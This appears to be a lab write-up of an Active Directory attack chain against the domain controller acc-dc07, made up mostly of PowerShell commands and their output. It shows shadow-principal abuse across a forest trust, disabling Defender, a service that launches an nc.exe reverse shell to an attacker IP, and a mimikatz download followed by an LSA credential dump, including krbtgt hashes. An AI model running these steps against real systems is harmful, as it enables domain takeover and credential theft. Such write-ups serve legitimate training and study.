---
layout: default
---

## acc-dc07.gcbacc.local 192.168.79.1


The full access to this machine is performed for attacker it-employee15 machine and credentials extracted on sec-dc.gcbsec.local:
```
[+] Password found !!!
Type: ssp_creds
Domain: sec
Password: Password123
Login: syslogagent
```

### 1. Impersonate user syslog agent from powershell

```
PS C:\Users\itemployee15> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
PS C:\Users\itemployee15> $credential = New-Object System.Management.Automation.PSCredential ('sec\syslogagent', $password)

```

### 2. create session and access to sec-syslog01
```
PS C:\Users\itemployee15> $secdc = New-PSSession -ComputerName 192.168.144.197 -Credential $credential
PS C:\Users\itemployee15> $secdc

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.144.197 RemoteMachine   Opened        Microsoft.PowerShell     Available
```

```
PS C:\Users\itemployee15> Enter-PSSession -Session $secdc
[192.168.144.197]: PS C:\Users\syslogagent\Documents> whoami
sec\syslogagent
```

### 3. Create session with EA privileges on sec-dc

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> $password = ConvertTo-SecureString 'Password123' -AsPlainText -Force
[192.168.144.197]: PS C:\Users\syslogagent\Documents> $credential = New-Object System.Management.Automation.PSCredential ('sec\syslogagent', $password)
[192.168.144.197]: PS C:\Users\syslogagent\Documents> $secdc = New-PSSession -ComputerName sec-dc -Credential $credential
``` 

### 4. Enumerate and abuse shadow principals between gcbsec.local and gcbacc.local 

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $secdc


Name                    : Shadow Principal Configuration
member                  : {}
msDS-ShadowPrincipalSid :

Name                    : accforest-ShadowEnterpriseAdmin
member                  : {}
msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519
```
Set syslogagent as accforest-ShadowENterprise admin
```
 Invoke-Command -ScriptBlock {Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local" -Add @{'member'="CN=syslogagent,CN=Users,DC=gcbsec,DC=local"} -Verbose} -Session $secdc
VERBOSE: Performing the operation "Set" on target "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local".
```

Set Administrator as accforest-ShadowEnterprise Admin
```
Invoke-Command -ScriptBlock {Set-ADObject -Identity "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local" -Add @{'member'="CN=Administrator,CN=Users,DC=gcbsec,DC=local"} -Verbose} -Session $secdc
VERBOSE: Performing the operation "Set" on target "CN=accforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=gcbsec,DC=local".
```

validate members:
```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl} -Session $secdc


Name                    : Shadow Principal Configuration
member                  : {}
msDS-ShadowPrincipalSid :

Name                    : accforest-ShadowEnterpriseAdmin
member                  : {CN=syslogagent,CN=Users,DC=gcbsec,DC=local, CN=Administrator,CN=Users,DC=gcbsec,DC=local}
msDS-ShadowPrincipalSid : S-1-5-21-3331877400-209796306-1317730910-519


```


### 5. Enter session on gcbacc.local

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {set-item WSMan:\localhost\Client\TrustedHosts -Value * -Force} -Session $secdc
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock { $accdc = New-PSSession -ComputerName 192.168.79.1 -Credential gcbsec.local\syslogagent} -Session $secdc
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{whoami;hostname} -Session $accdc} -Session $secdc
sec\syslogagent
acc-dc07
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{whoami;hostname;ipconfig} -Session $accdc} -Session $secdc
sec\syslogagent
acc-dc07

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::aa48:e8b7:2ad4:69b%9
   IPv4 Address. . . . . . . . . . . : 192.168.79.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.79.254
```

### 6. Disable AV 

```
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealTimeMonitoring $True; Get-MpPreference} -Session $accdc} -Session $secdc                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    PSComputerName                                        : sec-dc                                                                                                                            RunspaceId                                            : 897c70af-2d3a-4827-a54c-109d632e0159                                                                                              AllowDatagramProcessingOnWinServer                    : False                                                                                                                             AllowNetworkProtectionDownLevel                       : False                                                                                                                             AllowNetworkProtectionOnWinServer                     : False                                                                                                                             AllowSwitchToAsyncInspection                          : False                                                                                                                             ApplyDisableNetworkScanningToIOAV                     : False                                                                                                                             AttackSurfaceReductionOnlyExclusions                  :                                                                                                                                   AttackSurfaceReductionRules_Actions                   :                                                                                                                                   AttackSurfaceReductionRules_Ids                       :                                                                                                                                   AttackSurfaceReductionRules_RuleSpecificExclusions    :                                                                                                                                   AttackSurfaceReductionRules_RuleSpecificExclusions_Id :                                                                                                                                   CheckForSignaturesBeforeRunningScan                   : False                                                                                                                             CloudBlockLevel                                       : 0                                                                                                                                 CloudExtendedTimeout                                  : 0                                                                                                                                 ComputerID                                            : 6BEB27A9-17D2-457C-A169-C243E229DB03                                                                                              ControlledFolderAccessAllowedApplications             :                                                                                                                                   ControlledFolderAccessProtectedFolders                :                                                                                                                                   DefinitionUpdatesChannel                              : 0                                                                                                                                 DisableArchiveScanning                                : False                                                                                                                             DisableAutoExclusions                                 : False                                                                                                                             DisableBehaviorMonitoring                             : False                                                                                                                             DisableBlockAtFirstSeen                               : False                                                                                                                             DisableCacheMaintenance                               : False                                                                                                                             DisableCatchupFullScan                                : True                                                                                                                              DisableCatchupQuickScan                               : True                                                                                                                              DisableCpuThrottleOnIdleScans                         : True                                                                                                                              DisableDatagramProcessing                             : False                                                                                                                             DisableDnsOverTcpParsing                              : False                                                                                                                             DisableDnsParsing                                     : False                                                                                                                             DisableEmailScanning                                  : True                                                                                                                              DisableFtpParsing                                     : False                                                                                                                             DisableGradualRelease                                 : False                                                                                                                             DisableHttpParsing                                    : False                                                                                                                             DisableInboundConnectionFiltering                     : False                                                                                                                             DisableIOAVProtection                                 : False                                                                                                                             DisableNetworkProtectionPerfTelemetry                 : False                                                                                                                             DisablePrivacyMode                                    : False                                                                                                                             DisableQuicParsing                                    : False                                                                                                                             DisableRdpParsing                                     : False                                                                                                                             DisableRealtimeMonitoring                             : True                                                                                                                              DisableRemovableDriveScanning                         : True                                                                                                                              DisableRestorePoint                                   : True                                                                                                                              DisableScanningMappedNetworkDrivesForFullScan         : True                                                                                                                              DisableScanningNetworkFiles                           : False                                                                                                                             DisableScriptScanning                                 : False                                                                                                                             DisableSmtpParsing                                    : False                                                                                                                             DisableSshParsing                                     : False                                                                                                                             DisableTlsParsing                                     : False                                                                                                                             EnableControlledFolderAccess                          : 0                                                                                                                                 EnableConvertWarnToBlock                              : False                                                                                                                             EnableDnsSinkhole                                     : True                                                                                                                              EnableFileHashComputation                             : False                                                                                                                             EnableFullScanOnBatteryPower                          : False                                                                                                                             EnableLowCpuPriority                                  : False                                                                                                                             EnableNetworkProtection                               : 0                                                                                                                                 EngineUpdatesChannel                                  : 0                                                                                                                                 ExclusionExtension                                    :                                                                                                                                   ExclusionIpAddress                                    :                                                                                                                                   ExclusionPath                                         :                                                                                                                                   ExclusionProcess                                      :                                                                                                                                   ForceUseProxyOnly                                     : False                                                                                                                             HideExclusionsFromLocalUsers                          : True                                                                                                                              HighThreatDefaultAction                               : 0                                                                                                                                 IntelTDTEnabled                                       :                                                                                                                                   LowThreatDefaultAction                                : 0                                                                                                                                 MAPSReporting                                         : 2                                                                                                                                 MeteredConnectionUpdates                              : False                                                                                                                             ModerateThreatDefaultAction                           : 0                                                                                                                                 NetworkProtectionReputationMode                       : 0                                                                                                                                 OobeEnableRtpAndSigUpdate                             : False                                                                                                                             PerformanceModeStatus                                 : 1                                                                                                                                 PlatformUpdatesChannel                                : 0                                                                                                                                 ProxyBypass                                           :                                                                                                                                   ProxyPacUrl                                           :                                                                                                                                   ProxyServer                                           :                                                                                                                                   PUAProtection                                         : 0                                                                                                                                 QuarantinePurgeItemsAfterDelay                        : 90                                                                                                                                QuickScanIncludeExclusions                            : 0                                                                                                                                 RandomizeScheduleTaskTimes                            : True                                                                                                                              RealTimeScanDirection                                 : 0                                                                                                                                 RemediationScheduleDay                                : 0                                                                                                                                 RemediationScheduleTime                               : 02:00:00                                                                                                                          ReportDynamicSignatureDroppedEvent                    : False                                                                                                                             ReportingAdditionalActionTimeOut                      : 10080                                                                                                                             ReportingCriticalFailureTimeOut                       : 10080                                                                                                                             ReportingNonCriticalTimeOut                           : 1440                                                                                                                              ScanAvgCPULoadFactor                                  : 50                                                                                                                                ScanOnlyIfIdleEnabled                                 : True                                                                                                                              ScanParameters                                        : 1                                                                                                                                 ScanPurgeItemsAfterDelay                              : 15                                                                                                                                ScanScheduleDay                                       : 0                                                                                                                                 ScanScheduleOffset                                    : 120                                                                                                                               ScanScheduleQuickScanTime                             : 00:00:00                                                                                                                          ScanScheduleTime                                      : 02:00:00                                                                                                                          SchedulerRandomizationTime                            : 4                                                                                                                                 ServiceHealthReportInterval                           : 60                                                                                                                                SevereThreatDefaultAction                             : 0                                                                                                                                 SharedSignaturesPath                                  :                                                                                                                                   SharedSignaturesPathUpdateAtScheduledTimeOnly         : False                                                                                                                             SignatureAuGracePeriod                                : 0                                                                                                                                 SignatureBlobFileSharesSources                        :                                                                                                                                   SignatureBlobUpdateInterval                           : 60                                                                                                                                SignatureDefinitionUpdateFileSharesSources            :                                                                                                                                   SignatureDisableUpdateOnStartupWithoutEngine          : False                                                                                                                             SignatureFallbackOrder                                : MicrosoftUpdateServer|MMPC                                                                                                        SignatureFirstAuGracePeriod                           : 120                                                                                                                               SignatureScheduleDay                                  : 8                                                                                                                                 SignatureScheduleTime                                 : 01:45:00                                                                                                                          SignatureUpdateCatchupInterval                        : 1                                                                                                                                 SignatureUpdateInterval                               : 0                                                                                                                                 SubmitSamplesConsent                                  : 1                                                                                                                                 ThreatIDDefaultAction_Actions                         :                                                                                                                                   ThreatIDDefaultAction_Ids                             :                                                                                                                                   ThrottleForScheduledScanOnly                          : True                                                                                                                              TrustLabelProtectionStatus                            : 0                                                                                                                                 UILockdown                                            : False                                                                                                                             UnknownThreatDefaultAction                            : 0                                                                                                                                                                                                   
```

### 7. Create service for and stable connection

```
 [192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{ cmd /c sc create REVERSE binPath= "cmd /c C:\nc.exe -e cmd 192.168.100.15 443" } -Session $accdc} -Session $secdc
[SC] CreateService SUCCESS
[192.168.144.197]: PS C:\Users\syslogagent\Documents> Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock{ cmd /c sc start REVERSE } -Session $accdc} -Session $secdc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

[192.168.144.197]: PS C:\Users\syslogagent\Documents>

```


### 8. Dump domain credentials:

```
PS C:\> wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
wget http://192.168.100.15/mimikatz.exe -OutFile C:\mimikatz.exe
PS C:\> ls
ls


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        10/2/2020   2:42 AM                PerfLogs
d-r---         9/5/2019   4:06 AM                Program Files
d-----        5/25/2019   4:45 AM                Program Files (x86)
d-----        2/14/2024  12:08 PM                Transcripts
d-r---        9/13/2019   7:17 AM                Users
d-----        2/15/2024   3:46 AM                Windows
-a----        7/25/2024   2:24 PM        1489408 mimikatz.exe
-a----        7/25/2024   2:20 PM          38616 nc.exe


PS C:\> C:\mimikatz.exe "privilege::debug" "lsadump::lsa /inject" "exit"
C:\mimikatz.exe "privilege::debug" "lsadump::lsa /inject" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /inject
Domain : ACC / S-1-5-21-3331877400-209796306-1317730910

RID  : 000001f4 (500)
User : Administrator

 * Primary
    NTLM : 70d6b3cabbe11f8f0b06a7380e7a5005
    LM   :
  Hash NTLM: 70d6b3cabbe11f8f0b06a7380e7a5005
    ntlm- 0: 70d6b3cabbe11f8f0b06a7380e7a5005
    ntlm- 1: c87a64622a487061ab81e51cc711a34b
    lm  - 0: 4469739c87b8924f24a1cf0ae43a38ae

 * WDigest
    01  a1daa7ded0d0998e66057429509709a2
    02  3aeb0e5620f78cfec3057b860a7c78eb
    03  b35a7f9549ebf242b2c455b6553959d9
    04  a1daa7ded0d0998e66057429509709a2
    05  fd4b7c318d3419491517c00c16ae2829
    06  c6348aa48f3d9425ad597c0e0c688345
    07  ca38efb3636aa31a4236aac01c159d99
    08  eb170ffd92a5e806546d602b0336a2b5
    09  580f9d24c62d0b2484b519787710b10c
    10  dbabb3568fee6539731e1a2da6ff9c15
    11  68b036086d85c098010a9b9e1ba362f2
    12  eb170ffd92a5e806546d602b0336a2b5
    13  c804d08c5a63699198d76cdecd739841
    14  7195d7336cdf437c50afaf80b29b7434
    15  c9b6dd7e7fc40f69fae44fe467be4994
    16  72be1da83ce01cc5903c5c74ddbe0b9f
    17  1a30f252f9afbef3fbcd57169a707ba8
    18  4a2df9fb5cf890068dd166ce7b5835e4
    19  d479255357d1d5e319fcab9bcd6e2675
    20  3a70b4293e925fceb141d1a23c7dd018
    21  39ebeb37409bcfbc32441036199a12d2
    22  a53728b002c309fc1596f1419c84ff9f
    23  3e0e9092bec1ee0b8483c1acb6204700
    24  29c422edf66f7cd1ba6cce939ae40409
    25  608113e5a875ab26cc8dbcd6fe221aae
    26  509e19a4b931636755c8e75c1d26add6
    27  8eb042f1fd4337c625e04ff055654ec5
    28  b4f011f55e422e0253b31a65e7bcc2f9
    29  b5214351c59ffa0a3b73e4fe2073f8e1

 * Kerberos
    Default Salt : GCBACC.LOCALAdministrator
    Credentials
      des_cbc_md5       : 1991b5c1d0dca7ae
    OldCredentials
      des_cbc_md5       : c486801a028a2664

 * Kerberos-Newer-Keys
    Default Salt : GCBACC.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c7be62bcc5d4e1d45c29c4e90bc543c0596b4f0b31bffb791cfec73ae93e334f
      aes128_hmac       (4096) : 1ead57438920b74ff1fbadd017fa6f6a
      des_cbc_md5       (4096) : 1991b5c1d0dca7ae
    OldCredentials
      aes256_hmac       (4096) : 51062bfba4cc505d05daf0ca563737c6c3ac2eb29f98cb87d6ceb25930151be9
      aes128_hmac       (4096) : c493ee1f472891e2f56ddbeb7b41956a
      des_cbc_md5       (4096) : c486801a028a2664
    OlderCredentials
      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
      des_cbc_md5       (4096) : 31435d975783d0d0

 * NTLM-Strong-NTOWF
    Random Value : be91a3815a14eaff583f5f86be282d68

RID  : 000001f5 (501)
User : Guest

 * Primary
    NTLM :
    LM   :

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 424db28087e04ff82439041d5a733d09
    LM   :
  Hash NTLM: 424db28087e04ff82439041d5a733d09
    ntlm- 0: 424db28087e04ff82439041d5a733d09
    lm  - 0: fd7e39f8b7987eeef73c2a28eea2434d

 * WDigest
    01  d6d0c5cf3fd58bb02f3a1d9e1a9359fb
    02  4e7d7c1338160d639b4c7eb2db7f5fd7
    03  cda247a0e201dd2b57a81b8777a92e4f
    04  d6d0c5cf3fd58bb02f3a1d9e1a9359fb
    05  4e7d7c1338160d639b4c7eb2db7f5fd7
    06  7e911b48164a4a3f3d5eb13b2fa2c166
    07  d6d0c5cf3fd58bb02f3a1d9e1a9359fb
    08  6e887e73dfb65f25e08dfa8866df82e2
    09  6e887e73dfb65f25e08dfa8866df82e2
    10  e25f5075294a18501821053b1d15b893
    11  710a5a3cb65b23852b7918dbeedbc20f
    12  6e887e73dfb65f25e08dfa8866df82e2
    13  27c4a63ea9fa3a18e8fbd7a697507969
    14  710a5a3cb65b23852b7918dbeedbc20f
    15  985dbea5da5a18d615da979119d17943
    16  985dbea5da5a18d615da979119d17943
    17  475f6ae1de481e579026915004bd80bb
    18  ccb3ca6573ad4582bcf73b8727dd7be7
    19  c4cf9dd54678c51d667793f45da32c57
    20  803c411a7bafa48495371dc55328f0f2
    21  bc608a93f4a4c50afb2b4df2a7299733
    22  bc608a93f4a4c50afb2b4df2a7299733
    23  f69db03788a6c4eb4c0ddd911f21fe14
    24  e4b52afd0655b79b5cef6529dc039a22
    25  e4b52afd0655b79b5cef6529dc039a22
    26  f6a54816a57cc7ab0dec0c06b3550ff4
    27  b46234cf39e9c0d3f2647929ee09fa25
    28  5f2fad6cbfb515b57d44f26d53c1a37d
    29  f018c3a94e5d512b953b12a2692933e3

 * Kerberos
    Default Salt : GCBACC.LOCALkrbtgt
    Credentials
      des_cbc_md5       : b9d9bc925b6d5798

 * Kerberos-Newer-Keys
    Default Salt : GCBACC.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : d36fd4c2561078f2f7230d81fa0b32719bc440224c2cd4e531e278e6272748b7
      aes128_hmac       (4096) : 41ec47d1b8e8b36155edc84a50390ef5
      des_cbc_md5       (4096) : b9d9bc925b6d5798

 * NTLM-Strong-NTOWF
    Random Value : eafabcb0b07b290abbb022680adefba2

RID  : 000003e8 (1000)
User : ACC-DC07$

 * Primary
    NTLM : b337f797ea0ada49d01db9f8c1fe0255
    LM   :
  Hash NTLM: b337f797ea0ada49d01db9f8c1fe0255
    ntlm- 0: b337f797ea0ada49d01db9f8c1fe0255
    ntlm- 1: 426f6abbf19e85988370951cbb954d15
    ntlm- 2: 9d35c6e72ce185a772c3417283c1af18
    lm  - 0: 650560eddfcd7194500bcd30d97db85c
    lm  - 1: 7cc351d9b074a149d87cb876eb949492

 * WDigest
    01  904d042a2a31b77c17c9a6afdcaa55d1
    02  ad6c4780dfba0ca42bd805dbb605c9a9
    03  904d042a2a31b77c17c9a6afdcaa55d1
    04  904d042a2a31b77c17c9a6afdcaa55d1
    05  44c3bba5e8c0da6d08697f92d5a4042e
    06  44c3bba5e8c0da6d08697f92d5a4042e
    07  e9d4cf3cbb5deddfa26ee93e2ca89942
    08  c1a54a1e6909d664a028bb7533424369
    09  58ec3a17614b521bb8a1ce111df2ca6f
    10  1315a9562ee41422564f68f93362f117
    11  1315a9562ee41422564f68f93362f117
    12  c1a54a1e6909d664a028bb7533424369
    13  c1a54a1e6909d664a028bb7533424369
    14  d671e328f532d0dc83924fc72efdd999
    15  96cb0e5e57347aa0bf2d90cbd8ec8584
    16  5796feffed8f58b2ce412cc8dabc7d6c
    17  467ef8fdad14051fb6a7be12dc58b4ff
    18  0c3c5a46c0e21fa4862a210596c87dda
    19  55e5b2562bc500be0e4701f36a6e5eaa
    20  0c3c5a46c0e21fa4862a210596c87dda
    21  56e61d4cb214c71b2faf17a121c79287
    22  e3176548660c63b55a994ce8d88be79f
    23  56e61d4cb214c71b2faf17a121c79287
    24  f153890eb7106e2c9542c65186739efd
    25  493d2a4aec05b638cd3410f499f61d24
    26  6537b35d2e4650f597eb8878ff8c75fa
    27  b54a87c98c7310e62d6f71bc70e1e875
    28  fd8c063c68c2b31ee610a0e5d599482f
    29  b54a87c98c7310e62d6f71bc70e1e875

 * Kerberos
    Default Salt : GCBACC.LOCALhostacc-dc07.gcbacc.local
    Credentials
      des_cbc_md5       : 07e9458079e00b6e
    OldCredentials
      des_cbc_md5       : a41f7c43866d5b9d

 * Kerberos-Newer-Keys
    Default Salt : GCBACC.LOCALhostacc-dc07.gcbacc.local
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0b6fa3cfdabc43dc636e634d54f24b924a29a2a50ae5af9a887f39fc22e495c8
      aes128_hmac       (4096) : fbe1f0778827b831efe85d3b2ffae5cf
      des_cbc_md5       (4096) : 07e9458079e00b6e
    OldCredentials
      aes256_hmac       (4096) : 8b7cffebde5c45edb5d01a46fc1456f76dc825872f8100e3abfdd889d2915c9c
      aes128_hmac       (4096) : 42c30ae2279b429340f90f0aa59b25aa
      des_cbc_md5       (4096) : a41f7c43866d5b9d
    OlderCredentials
      aes256_hmac       (4096) : ea8a5196d687e81be7659693fccc28bb0890a54b94f76585093987d520f012fc
      aes128_hmac       (4096) : 5b736eeaafde72e12c0f353d4b2e3d6e
      des_cbc_md5       (4096) : c7cbb05ba81691ec

RID  : 0000044f (1103)
User : ACC-DATA$

 * Primary
    NTLM : 41e43c7f30326a9658e7dc27205b2a93
    LM   :
  Hash NTLM: 41e43c7f30326a9658e7dc27205b2a93
    ntlm- 0: 41e43c7f30326a9658e7dc27205b2a93
    ntlm- 1: 2e50263681ec594d1614348e2d47e806
    ntlm- 2: 0a2541b6e7b3808de38f9669e1f05f24
    lm  - 0: e7a01792510f407a32a5923502764329
    lm  - 1: 7942200395c5950be1c048169b64c8ac
    lm  - 2: 1be7ff6a2dcb00e9247bcb9da5be79f7

 * WDigest
    01  854535bc455b9b03a264b280ee9fb457
    02  b750375f203b7d8191039ee130632e56
    03  854535bc455b9b03a264b280ee9fb457
    04  854535bc455b9b03a264b280ee9fb457
    05  8fe1db2eea01f786974db47c00852649
    06  8fe1db2eea01f786974db47c00852649
    07  22cb8364e0322b4ff2554a679a1048f6
    08  3450ab76ff5e46d98afe29a55e33ba4f
    09  251749dbfff2c8498078550e8c624788
    10  1556f96b13ade8535090f40e0769330b
    11  1556f96b13ade8535090f40e0769330b
    12  3450ab76ff5e46d98afe29a55e33ba4f
    13  3450ab76ff5e46d98afe29a55e33ba4f
    14  0e21a4afa75e1dc08e9057b4edf8d4c2
    15  97e70b4b74e02219d3ab6671ec114dba
    16  10ef498e8d8efafdb5442733955ed8fb
    17  5bdf2af3a9c47850d374918563e11a1b
    18  b9c6d9b1c4c101f854ab1c838dd23ea6
    19  1bc64c4630de3cecc321d9dce802de43
    20  b9c6d9b1c4c101f854ab1c838dd23ea6
    21  a2f935fbbadd38316d0938f94f246e69
    22  bf53aef97d13cffeedb4d874800cb168
    23  a2f935fbbadd38316d0938f94f246e69
    24  195d1258060e17d1d0de58c2643e644b
    25  02f10996e6cc2a9aed008574097c282c
    26  e39854ded35b81a41544c7b067b89657
    27  9feae52f4358f37569c4ca1d4908a228
    28  c77b07d685950f0adbd115fa0d86dea4
    29  9feae52f4358f37569c4ca1d4908a228

 * Kerberos
    Default Salt : GCBACC.LOCALhostacc-data.gcbacc.local
    Credentials
      des_cbc_md5       : bf4c92cb1616cea4
    OldCredentials
      des_cbc_md5       : 98460d2c673d6b46

 * Kerberos-Newer-Keys
    Default Salt : GCBACC.LOCALhostacc-data.gcbacc.local
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 767562cf7478c571d4d25f1a7fc5ddb64ca3e71579ad79399cd6212c02523233
      aes128_hmac       (4096) : dfcefbfe3dc4e2eb1c0f80d95c01047d
      des_cbc_md5       (4096) : bf4c92cb1616cea4
    OldCredentials
      aes256_hmac       (4096) : e3dd518eeb561d6df5c2b3f3e0ab8c97abe40a377f614b783fd68195bd82e2f1
      aes128_hmac       (4096) : 57b836cb0068705bf96b07b776de1b64
      des_cbc_md5       (4096) : 98460d2c673d6b46
    OlderCredentials
      aes256_hmac       (4096) : 514cf8bd97737d261abd66425433c50f403bdd8088b193ad21e99d2c4e0dd921
      aes128_hmac       (4096) : af43aa8e3719bb9acc97e6d22d68fa61
      des_cbc_md5       (4096) : efd0cebceadccb34

mimikatz(commandline) # exit
Bye!
PS C:\>

PS C:\> C:\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"
C:\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /patch
Domain : ACC / S-1-5-21-3331877400-209796306-1317730910

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 70d6b3cabbe11f8f0b06a7380e7a5005

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 424db28087e04ff82439041d5a733d09

RID  : 000003e8 (1000)
User : ACC-DC07$
LM   :
NTLM : b337f797ea0ada49d01db9f8c1fe0255

RID  : 0000044f (1103)
User : ACC-DATA$
LM   :
NTLM : 41e43c7f30326a9658e7dc27205b2a93

mimikatz(commandline) # exit
Bye!
PS C:\>


```

[back](./section6.html)